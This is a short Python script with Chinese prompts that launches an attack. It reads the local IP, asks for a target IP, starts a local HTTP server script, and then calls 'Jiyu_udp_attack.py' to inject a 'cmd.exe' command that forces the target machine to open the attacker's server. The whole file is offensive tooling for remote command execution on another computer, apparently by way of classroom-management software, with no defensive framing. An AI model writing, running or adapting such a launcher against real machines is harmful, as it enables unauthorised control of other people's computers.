import os
import time
import socket

Host_name = socket.gethostname()
Ip_address = socket.gethostbyname(Host_name)
print(f"主机IP:{Ip_address}\n")
Port = 8000

Tagt_Ip = input("输入目标IP:")

os.system('start cmd /c python Http_server.py')
time.sleep(1)
os.system(f'python Jiyu_udp_attack.py -ip {Tagt_Ip} -c "cmd.exe /c start http://{Ip_address}:{Port}"')